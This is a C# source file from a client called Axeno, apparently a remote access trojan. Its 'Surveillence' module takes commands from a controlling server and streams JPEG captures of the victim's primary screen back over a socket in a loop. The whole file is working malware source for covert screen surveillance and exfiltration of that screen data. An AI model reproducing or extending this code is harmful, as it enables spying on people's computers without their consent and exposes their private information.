using Axeno.Client.MessagePack;
using System;
using System.Collections.Generic;
using System.Drawing.Imaging;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Sockets;
using Axeno.Client.Helper;

namespace Axeno.Client.Networking.Functions.Surveillence
{
    internal class RemoteDesktop
    {
        public static bool streaming = false;
        public static void HandlePacket(MsgPack msgpack)
        {
            string command = msgpack.ForcePathObject("Option").AsString;
            switch (command)
            {
                case "GetInfo":
                    {
                        SendRDPInfo();
                        break;
                    }
                case "StartStreaming":
                    {
                        streaming = true;
                        new Task(() =>
                        {
                            StartStreaming();

                        }).Start();
                        break;
                    }
                case "StopStreaming":
                    {
                        streaming = false;
                        break;
                    }
            }

        }
        public static void SendRDPInfo()
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "RemoteDesktopInformation";
            msgpack.ForcePathObject("Screens").AsInteger = Convert.ToInt32(Screen.AllScreens.Length);
            ClientSocket.Send(msgpack.Encode2Bytes());
        }
        public static void StartStreaming()
        {
            while (streaming && ClientSocket.IsConnected)
            {
                try
                {
                    Bitmap bmpScreen = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                    Graphics g = Graphics.FromImage(bmpScreen);
                    g.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, bmpScreen.Size, CopyPixelOperation.SourceCopy);

                    byte[] desktopData;
                    using (MemoryStream ms = new MemoryStream())
                    {
                        bmpScreen.Save(ms, ImageFormat.Jpeg);
                        desktopData = ms.ToArray();
                    }

                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "DesktopStream";
                    msgpack.ForcePathObject("Stream").SetAsBytes(desktopData);

                    ClientSocket.Send(msgpack.Encode2Bytes());
                }catch
                {
                    streaming = false;
                    ClientSocket.IsConnected= false;
                }
            }
        }
    }
}
